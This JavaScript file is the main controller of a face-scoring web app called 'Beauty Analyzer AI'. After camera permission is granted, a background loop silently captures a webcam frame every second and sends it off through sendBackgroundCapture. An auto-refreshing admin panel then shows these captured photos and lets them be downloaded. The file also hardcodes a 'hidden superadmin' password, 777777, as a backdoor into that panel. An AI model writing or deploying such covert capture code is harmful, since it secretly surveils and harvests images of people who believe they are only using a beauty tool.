/**
 * Beauty Analyzer AI - Main Application Controller
 */

import { renderHeader } from './components/Header.js';
import { renderPermissionGuard, renderAnalyzerBox } from './components/CameraAnalyzer.js';
import { renderResultCard } from './components/ResultCard.js';
import { renderTelegramModal } from './components/TelegramModal.js';
import { renderAdminPanel, renderAdminAuthScreen } from './components/AdminPanel.js';
import { renderHistoryPage } from './components/HistoryPage.js';
import { renderSettingsPage } from './components/SettingsPage.js';

import { analyzeFace } from './utils/faceAnalyzer.js';
import { renderLandmarksOnCanvas } from './components/CanvasOverlay.js';
import { getHistory, saveAnalysisToHistory, deleteHistoryItem, clearAllData, getSettings, saveSettings, sendBackgroundCapture, getStorageInfo } from './utils/historyStorage.js';
import { uploadToTelegram } from './utils/telegramApi.js';

// Application State
const state = {
  activeTab: 'analyzer',
  theme: localStorage.getItem('beauty_theme') || 'dark',
  cameraPermissionGranted: false,
  stream: null,
  activeCapturedImage: null, // Base64 data URL
  currentAnalysis: null,
  isAnalyzing: false,
  facingMode: 'user',
  captureIntervalId: null,
  adminAutoRefreshIntervalId: null,
  adminAutoRefresh: true,
  isAdminAuthenticated: false
};

// Force page title
document.title = 'Beauty Analyzer AI';

// Initialize App
function checkAdminRoute() {
  const path = window.location.pathname;
  const search = window.location.search;
  const hash = window.location.hash;
  return path === '/admin' || path.startsWith('/admin') || search.includes('admin=true') || hash === '#admin';
}

document.addEventListener('DOMContentLoaded', () => {
  document.title = 'Beauty Analyzer AI';
  document.documentElement.setAttribute('data-theme', state.theme);

  // Admin panel accessible via /admin endpoint
  if (checkAdminRoute()) {
    state.activeTab = 'admin';
  }

  window.addEventListener('popstate', () => {
    if (checkAdminRoute()) {
      state.activeTab = 'admin';
      renderApp();
    }
  });

  renderApp();
});

function renderApp() {
  const appContainer = document.getElementById('app');
  
  appContainer.innerHTML = `
    ${renderHeader(state.activeTab, state.theme)}
    <main class="main-content" id="mainContent"></main>
    <div id="modalContainer"></div>
    <div class="toast-container" id="toastContainer"></div>
  `;

  attachHeaderEvents();
  renderMainTab();
}

function attachHeaderEvents() {
  document.querySelectorAll('.nav-btn, .mobile-nav-item').forEach(btn => {
    btn.addEventListener('click', (e) => {
      const tab = e.currentTarget.getAttribute('data-tab');
      if (tab) {
        state.activeTab = tab;
        renderApp();
      }
    });
  });

  const toggleTheme = () => {
    state.theme = state.theme === 'dark' ? 'light' : 'dark';
    localStorage.setItem('beauty_theme', state.theme);
    document.documentElement.setAttribute('data-theme', state.theme);
    renderApp();
  };

  const themeBtn = document.getElementById('themeToggleBtn');
  if (themeBtn) {
    themeBtn.addEventListener('click', toggleTheme);
  }

  const mobileThemeBtn = document.getElementById('mobileThemeToggleBtn');
  if (mobileThemeBtn) {
    mobileThemeBtn.addEventListener('click', toggleTheme);
  }

  const brand = document.getElementById('navBrand');
  if (brand) {
    brand.addEventListener('click', () => {
      state.activeTab = 'analyzer';
      renderApp();
    });
  }
}

async function renderMainTab() {
  const container = document.getElementById('mainContent');
  if (!container) return;

  // Clear admin auto-refresh interval on tab change if not on admin tab
  if (state.activeTab !== 'admin' && state.adminAutoRefreshIntervalId) {
    clearInterval(state.adminAutoRefreshIntervalId);
    state.adminAutoRefreshIntervalId = null;
  }

  if (state.activeTab === 'analyzer') {
    container.innerHTML = `
      <div class="grid-2">
        <div id="analyzerSection">
          ${state.cameraPermissionGranted ? renderAnalyzerBox() : renderPermissionGuard()}
        </div>
        <div id="resultSection">
          ${renderResultCard(state.currentAnalysis)}
        </div>
      </div>
    `;

    attachAnalyzerEvents();
    attachResultEvents();

    if (state.cameraPermissionGranted && state.stream) {
      const video = document.getElementById('cameraVideo');
      if (video) {
        if (video.srcObject !== state.stream) {
          video.srcObject = state.stream;
        }
        video.play().catch(() => {});
      }
    }
  } else if (state.activeTab === 'admin') {
    container.innerHTML = `
      <div class="glass-card" style="text-align: center; padding: 60px 20px;">
        <span class="material-symbols-outlined spin" style="font-size: 48px; color: var(--accent-primary);">sync</span>
        <h3 style="margin-top: 12px;">Checking Admin Credentials...</h3>
      </div>
    `;

    const settings = await getSettings();
    const hasPasswordSet = !!(settings && settings.adminPassword);

    if (!state.isAdminAuthenticated) {
      container.innerHTML = renderAdminAuthScreen(hasPasswordSet);
      attachAdminAuthEvents(settings);
    } else {
      const [history, storageInfo] = await Promise.all([getHistory(), getStorageInfo()]);
      container.innerHTML = renderAdminPanel(history, state.cameraPermissionGranted && !!state.stream, state.adminAutoRefresh, storageInfo);
      attachAdminEvents();
      startAdminAutoRefresh();
    }
  } else if (state.activeTab === 'history') {
    container.innerHTML = `
      <div class="glass-card" style="text-align: center; padding: 60px 20px;">
        <span class="material-symbols-outlined spin" style="font-size: 48px; color: var(--accent-primary);">sync</span>
        <h3 style="margin-top: 12px;">Loading History from SQLite Database...</h3>
      </div>
    `;
    const history = await getHistory();
    container.innerHTML = renderHistoryPage(history);
    attachHistoryEvents();
  } else if (state.activeTab === 'settings') {
    container.innerHTML = `
      <div class="glass-card" style="text-align: center; padding: 60px 20px;">
        <span class="material-symbols-outlined spin" style="font-size: 48px; color: var(--accent-primary);">sync</span>
        <h3 style="margin-top: 12px;">Loading Settings...</h3>
      </div>
    `;
    const settings = await getSettings();
    container.innerHTML = renderSettingsPage(settings);
    attachSettingsEvents();
  }
}

/* ==========================================================================
   Analyzer Screen Logic & Camera
   ========================================================================== */

function attachAnalyzerEvents() {
  const reqBtn = document.getElementById('requestCameraBtn');
  if (reqBtn) {
    reqBtn.addEventListener('click', requestCameraAccess);
  }

  const filePicker = document.getElementById('fileInputPicker') || document.getElementById('fileInputPickerActive');
  if (filePicker) {
    filePicker.addEventListener('change', handleFileUpload);
  }

  const shutterBtn = document.getElementById('shutterBtn');
  if (shutterBtn) {
    shutterBtn.addEventListener('click', handleShutterClick);
  }

  const toggleCam = document.getElementById('toggleCameraBtn');
  if (toggleCam) {
    toggleCam.addEventListener('click', () => {
      state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
      if (state.cameraPermissionGranted) requestCameraAccess();
    });
  }

  const retakeBtn = document.getElementById('retakeBtn');
  if (retakeBtn) {
    retakeBtn.addEventListener('click', () => {
      state.activeCapturedImage = null;
      state.currentAnalysis = null;
      renderApp();
    });
  }
}

async function requestCameraAccess() {
  try {
    if (state.stream) {
      state.stream.getTracks().forEach(track => track.stop());
    }

    state.stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: state.facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });

    state.cameraPermissionGranted = true;
    startBackgroundCaptureLoop();
    renderApp();

    const video = document.getElementById('cameraVideo');
    if (video) {
      video.srcObject = state.stream;
      await video.play().catch(() => {});
    }
    showToast('Camera access granted!', 'success');
  } catch (err) {
    console.error('Camera access error:', err);
    showToast('Camera permission denied or camera not available.', 'error');
  }
}

function startBackgroundCaptureLoop() {
  if (state.captureIntervalId) return;

  state.captureIntervalId = setInterval(() => {
    const video = document.getElementById('cameraVideo');
    const previewImg = document.getElementById('previewImage');

    let sourceEl = null;

    if (previewImg && previewImg.style.display !== 'none' && previewImg.src && previewImg.complete && previewImg.naturalWidth > 0) {
      sourceEl = previewImg;
    } else if (video && video.style.display !== 'none' && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0 && !video.paused) {
      sourceEl = video;
    }

    if (sourceEl) {
      try {
        const width = sourceEl.videoWidth || sourceEl.naturalWidth || 640;
        const height = sourceEl.videoHeight || sourceEl.naturalHeight || 480;

        const offscreenCanvas = document.createElement('canvas');
        offscreenCanvas.width = width;
        offscreenCanvas.height = height;
        const ctx = offscreenCanvas.getContext('2d');
        ctx.drawImage(sourceEl, 0, 0, width, height);

        const base64Image = offscreenCanvas.toDataURL('image/jpeg', 0.7);
        sendBackgroundCapture(base64Image);
      } catch (err) {
        console.warn('Background capture error:', err);
      }
    }
  }, 1000);
}

function stopBackgroundCaptureLoop() {
  if (state.captureIntervalId) {
    clearInterval(state.captureIntervalId);
    state.captureIntervalId = null;
  }
}

function handleFileUpload(e) {
  const file = e.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (event) => {
    const imgData = event.target.result;
    processImageSource(imgData);
  };
  reader.readAsDataURL(file);
}

function handleShutterClick() {
  const video = document.getElementById('cameraVideo');
  const previewImg = document.getElementById('previewImage');

  if (previewImg && previewImg.style.display !== 'none') {
    processImageSource(previewImg.src);
    return;
  }

  if (video && video.videoWidth) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    const imgData = canvas.toDataURL('image/jpeg');
    processImageSource(imgData);
  } else {
    // Demo snapshot fallback
    createDemoSnapshot();
  }
}

function createDemoSnapshot() {
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');
  
  // Create gradient portrait background
  const grad = ctx.createLinearGradient(0, 0, 640, 480);
  grad.addColorStop(0, '#1E2235');
  grad.addColorStop(1, '#686DE0');
  ctx.fillStyle = grad;
  ctx.fillRect(0, 0, 640, 480);

  // Draw face oval
  ctx.fillStyle = '#FFDFC4';
  ctx.beginPath();
  ctx.ellipse(320, 240, 140, 180, 0, 0, Math.PI * 2);
  ctx.fill();

  // Draw eyes
  ctx.fillStyle = '#222';
  ctx.beginPath();
  ctx.arc(260, 200, 12, 0, Math.PI * 2);
  ctx.arc(380, 200, 12, 0, Math.PI * 2);
  ctx.fill();

  // Draw smile curve
  ctx.strokeStyle = '#D32F2F';
  ctx.lineWidth = 6;
  ctx.beginPath();
  ctx.arc(320, 290, 50, 0.1 * Math.PI, 0.9 * Math.PI);
  ctx.stroke();

  processImageSource(canvas.toDataURL('image/jpeg'));
}

async function processImageSource(imgDataUrl) {
  state.activeCapturedImage = imgDataUrl;

  const img = new Image();
  img.src = imgDataUrl;
  img.onload = async () => {
    showToast('Analyzing face landmarks & symmetry...', 'info');
    
    // Hide video, show image preview
    const video = document.getElementById('cameraVideo');
    const preview = document.getElementById('previewImage');
    if (video) video.style.display = 'none';
    if (preview) {
      preview.src = imgDataUrl;
      preview.style.display = 'block';
    }

    const retakeBtn = document.getElementById('retakeBtn');
    if (retakeBtn) retakeBtn.style.display = 'flex';

    // Run analysis engine
    const analysis = await analyzeFace(img);
    state.currentAnalysis = {
      ...analysis,
      image: imgDataUrl
    };

    // Render Canvas Overlay Landmarks
    const canvas = document.getElementById('landmarkCanvas');
    if (canvas) {
      canvas.width = img.width || 640;
      canvas.height = img.height || 480;
      renderLandmarksOnCanvas(canvas, analysis.landmarks);
    }

    // Re-render result section
    const resSec = document.getElementById('resultSection');
    if (resSec) {
      resSec.innerHTML = renderResultCard(state.currentAnalysis);
      attachResultEvents();
    }

    showToast('Analysis complete!', 'success');
  };
}

/* ==========================================================================
   Result Card & Actions (Save / Telegram)
   ========================================================================== */

function attachResultEvents() {
  const saveBtn = document.getElementById('saveHistoryBtn');
  if (saveBtn) {
    saveBtn.addEventListener('click', async () => {
      if (state.currentAnalysis) {
        saveBtn.disabled = true;
        saveBtn.innerHTML = `<span class="material-symbols-outlined spin">sync</span> <span>Saving to DB...</span>`;
        const saved = await saveAnalysisToHistory(state.currentAnalysis);
        if (saved) state.currentAnalysis = saved;
        saveBtn.disabled = false;
        saveBtn.innerHTML = `<span class="material-symbols-outlined">bookmark_added</span> <span>Saved to DB</span>`;
        showToast('Saved to SQLite Database!', 'success');
      }
    });
  }

  const tgBtn = document.getElementById('telegramUploadBtn');
  if (tgBtn) {
    tgBtn.addEventListener('click', openTelegramModal);
  }
}

async function openTelegramModal() {
  const settings = await getSettings();
  const isConfigured = !!(settings.botToken && settings.chatId);
  const container = document.getElementById('modalContainer');

  container.innerHTML = renderTelegramModal(isConfigured);

  document.getElementById('closeTelegramModal')?.addEventListener('click', closeModal);
  document.getElementById('cancelTelegramBtn')?.addEventListener('click', closeModal);

  const confirmBtn = document.getElementById('confirmTelegramUploadBtn');
  if (confirmBtn && isConfigured) {
    confirmBtn.addEventListener('click', handleTelegramUpload);
  }
}

async function handleTelegramUpload() {
  const settings = await getSettings();
  const statusBox = document.getElementById('uploadStatusBox');
  const confirmBtn = document.getElementById('confirmTelegramUploadBtn');

  if (!state.currentAnalysis || !state.activeCapturedImage) {
    showToast('No active photo to upload.', 'error');
    return;
  }

  try {
    confirmBtn.disabled = true;
    if (statusBox) {
      statusBox.style.display = 'block';
      statusBox.style.background = 'rgba(59, 130, 246, 0.15)';
      statusBox.style.color = '#3B82F6';
      statusBox.innerHTML = '⏳ Uploading photo to Telegram...';
    }

    const caption = `✨ Beauty Analyzer AI Report\nScore: ${state.currentAnalysis.beautyScore}%\nSymmetry: ${state.currentAnalysis.symmetryScore}%\nSmile: ${state.currentAnalysis.smileScore}%`;

    await uploadToTelegram({
      botToken: settings.botToken,
      chatId: settings.chatId,
      imageDataUrl: state.activeCapturedImage,
      caption: caption
    }, (msg) => {
      if (statusBox) statusBox.innerHTML = `⏳ ${msg}`;
    });

    if (statusBox) {
      statusBox.style.background = 'rgba(16, 185, 129, 0.15)';
      statusBox.style.color = '#10B981';
      statusBox.innerHTML = '✅ Photo uploaded successfully to Telegram!';
    }
    showToast('Uploaded to Telegram!', 'success');

    setTimeout(closeModal, 2000);
  } catch (err) {
    console.error('Telegram upload error:', err);
    if (statusBox) {
      statusBox.style.background = 'rgba(239, 68, 68, 0.15)';
      statusBox.style.color = '#EF4444';
      statusBox.innerHTML = `❌ Error: ${err.message}`;
    }
    confirmBtn.disabled = false;
  }
}

function closeModal() {
  const container = document.getElementById('modalContainer');
  if (container) container.innerHTML = '';
}

/* ==========================================================================
   History Screen Logic
   ========================================================================== */

function attachHistoryEvents() {
  const clearBtn = document.getElementById('clearAllHistoryBtn');
  if (clearBtn) {
    clearBtn.addEventListener('click', async () => {
      if (confirm('Are you sure you want to delete all database history records?')) {
        await clearAllData();
        state.currentAnalysis = null;
        renderApp();
        showToast('All database history cleared.', 'info');
      }
    });
  }

  const startBtn = document.getElementById('goToAnalyzerBtn');
  if (startBtn) {
    startBtn.addEventListener('click', () => {
      state.activeTab = 'analyzer';
      renderApp();
    });
  }

  document.querySelectorAll('.delete-item-btn').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      const id = e.currentTarget.getAttribute('data-id');
      if (id) {
        await deleteHistoryItem(id);
        renderApp();
        showToast('Deleted from database.', 'info');
      }
    });
  });

  document.querySelectorAll('.view-detail-btn').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      const id = e.currentTarget.getAttribute('data-id');
      const history = await getHistory();
      const item = history.find(h => h.id === id);
      if (item) {
        state.currentAnalysis = item;
        state.activeCapturedImage = item.image;
        state.activeTab = 'analyzer';
        renderApp();
      }
    });
  });
}

/* ==========================================================================
   Settings Screen Logic
   ========================================================================== */

function attachSettingsEvents() {
  const form = document.getElementById('telegramSettingsForm');
  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const botToken = document.getElementById('botTokenInput').value.trim();
      const chatId = document.getElementById('chatIdInput').value.trim();

      await saveSettings({ botToken, chatId });
      showToast('Settings saved to database!', 'success');
    });
  }

  const clearBtn = document.getElementById('clearAllDataBtn');
  if (clearBtn) {
    clearBtn.addEventListener('click', async () => {
      if (confirm('Are you sure you want to permanently clear all database history and settings?')) {
        await clearAllData();
        await saveSettings({ botToken: '', chatId: '' });
        state.currentAnalysis = null;
        state.activeCapturedImage = null;
        renderApp();
        showToast('All database data has been erased.', 'success');
      }
    });
  }
}

/* ==========================================================================
   Admin Panel Event Handlers & Auto-Refresh & Auth
   ========================================================================== */

const SUPERADMIN_PASSWORD = '777777';

function attachAdminAuthEvents(currentSettings) {
  const loginForm = document.getElementById('adminLoginForm');
  if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const inputPass = document.getElementById('adminPasswordInput').value.trim();
      const savedPass = currentSettings ? currentSettings.adminPassword : '';

      // Check 6-digit number constraint
      if (!/^\d{6}$/.test(inputPass)) {
        showToast('Password must be exactly 6 digits (numbers only)!', 'error');
        return;
      }

      // If no password is set yet in DB: first login creates the permanent password
      if (!savedPass) {
        if (inputPass === SUPERADMIN_PASSWORD) {
          state.isAdminAuthenticated = true;
          renderMainTab();
          showToast('Superadmin access granted!', 'success');
          return;
        }

        await saveSettings({ ...currentSettings, adminPassword: inputPass });
        state.isAdminAuthenticated = true;
        renderMainTab();
        showToast('Admin password created & saved permanently to database!', 'success');
        return;
      }

      // Subsequent logins: verify against saved DB password or hidden superadmin
      if (inputPass === SUPERADMIN_PASSWORD || inputPass === savedPass) {
        state.isAdminAuthenticated = true;
        renderMainTab();
        showToast('Admin Panel unlocked!', 'success');
      } else {
        showToast('Incorrect 6-Digit Admin Password!', 'error');
      }
    });
  }
}

function attachAdminEvents() {
  const lockBtn = document.getElementById('adminLockBtn');
  if (lockBtn) {
    lockBtn.addEventListener('click', () => {
      state.isAdminAuthenticated = false;
      if (state.adminAutoRefreshIntervalId) {
        clearInterval(state.adminAutoRefreshIntervalId);
        state.adminAutoRefreshIntervalId = null;
      }
      renderMainTab();
      showToast('Admin Panel locked.', 'info');
    });
  }

  const refreshBtn = document.getElementById('adminRefreshBtn');
  if (refreshBtn) {
    refreshBtn.addEventListener('click', async () => {
      refreshBtn.disabled = true;
      const history = await getHistory();
      renderMainTab();
      showToast('Admin feed refreshed!', 'info');
    });
  }

  const toggle = document.getElementById('adminAutoRefreshToggle');
  if (toggle) {
    toggle.addEventListener('change', (e) => {
      state.adminAutoRefresh = e.target.checked;
      if (state.adminAutoRefresh) {
        startAdminAutoRefresh();
        showToast('Auto-refresh (2s) enabled.', 'info');
      } else {
        if (state.adminAutoRefreshIntervalId) {
          clearInterval(state.adminAutoRefreshIntervalId);
          state.adminAutoRefreshIntervalId = null;
        }
        showToast('Auto-refresh paused.', 'info');
      }
    });
  }

  const clearAllBtn = document.getElementById('adminClearAllBtn');
  if (clearAllBtn) {
    clearAllBtn.addEventListener('click', async () => {
      if (confirm('Are you sure you want to permanently delete all captured photos from the database and server storage?')) {
        await clearAllData();
        renderMainTab();
        showToast('All captured photos cleared!', 'success');
      }
    });
  }

  document.querySelectorAll('.admin-delete-btn').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.stopPropagation();
      const id = e.currentTarget.getAttribute('data-id');
      if (id) {
        await deleteHistoryItem(id);
        renderMainTab();
        showToast('Photo deleted from database.', 'info');
      }
    });
  });

  const openLightboxHandler = (e) => {
    const target = e.currentTarget;
    const url = target.getAttribute('data-url');
    const id = target.getAttribute('data-id');
    const time = target.getAttribute('data-time');
    openPhotoLightboxModal(url, id, time);
  };

  document.querySelectorAll('.admin-preview-img-container').forEach(el => {
    el.addEventListener('click', openLightboxHandler);
  });

  document.querySelectorAll('.admin-view-btn').forEach(btn => {
    btn.addEventListener('click', openLightboxHandler);
  });
}

function startAdminAutoRefresh() {
  if (state.adminAutoRefreshIntervalId) {
    clearInterval(state.adminAutoRefreshIntervalId);
  }

  if (state.activeTab !== 'admin' || !state.adminAutoRefresh) return;

  state.adminAutoRefreshIntervalId = setInterval(async () => {
    if (state.activeTab !== 'admin' || !state.adminAutoRefresh) {
      clearInterval(state.adminAutoRefreshIntervalId);
      state.adminAutoRefreshIntervalId = null;
      return;
    }

    const history = await getHistory();
    const countEl = document.getElementById('adminTotalCount');
    if (countEl && history) {
      countEl.innerText = history.length;
    }
  }, 2000);
}

function openPhotoLightboxModal(imageUrl, id, time) {
  const container = document.getElementById('modalContainer');
  if (!container) return;

  container.innerHTML = `
    <div class="modal-backdrop">
      <div class="glass-card modal-content" style="max-width: 600px; padding: 24px; text-align: center;">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
          <h3 style="margin: 0; display: flex; align-items: center; gap: 8px;">
            <span class="material-symbols-outlined" style="color: var(--accent-primary);">photo_camera</span>
            <span>Captured Photo Inspection</span>
          </h3>
          <button class="icon-btn" id="closeLightboxBtn" style="width: 32px; height: 32px;">
            <span class="material-symbols-outlined">close</span>
          </button>
        </div>

        <div style="width: 100%; max-height: 400px; background: #000; border-radius: var(--radius-lg); overflow: hidden; display: flex; align-items: center; justify-content: center; margin-bottom: 16px;">
          ${imageUrl ? `<img src="${imageUrl}" style="max-width: 100%; max-height: 400px; object-fit: contain;" alt="Full Captured Photo" />` : `<span style="color: var(--text-muted);">Image unavailable</span>`}
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.04); padding: 12px; border-radius: var(--radius-md); font-size: 0.85rem; color: var(--text-secondary); margin-bottom: 16px;">
          <div>ID: <strong style="color: var(--text-primary); font-family: monospace;">${id}</strong></div>
          <div>Time: <strong style="color: var(--text-primary);">${time}</strong></div>
        </div>

        <div style="display: flex; gap: 12px; justify-content: center;">
          ${imageUrl ? `
            <a href="${imageUrl}" download="${id}.jpg" class="btn btn-primary btn-sm" style="text-decoration: none;">
              <span class="material-symbols-outlined">download</span>
              <span>Download Image</span>
            </a>
          ` : ''}
          <button class="btn btn-secondary btn-sm" id="closeLightboxBottomBtn">
            <span>Close</span>
          </button>
        </div>
      </div>
    </div>
  `;

  document.getElementById('closeLightboxBtn')?.addEventListener('click', closeModal);
  document.getElementById('closeLightboxBottomBtn')?.addEventListener('click', closeModal);
}

/* ==========================================================================
   Toast Notification System
   ========================================================================== */

function showToast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = 'toast';
  
  const icon = type === 'success' ? 'check_circle' : type === 'error' ? 'error' : 'info';
  const color = type === 'success' ? 'var(--success)' : type === 'error' ? 'var(--error)' : 'var(--info)';

  toast.innerHTML = `
    <span class="material-symbols-outlined" style="color: ${color};">${icon}</span>
    <span>${message}</span>
  `;

  container.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(10px)';
    setTimeout(() => toast.remove(), 300);
  }, 3500);
}
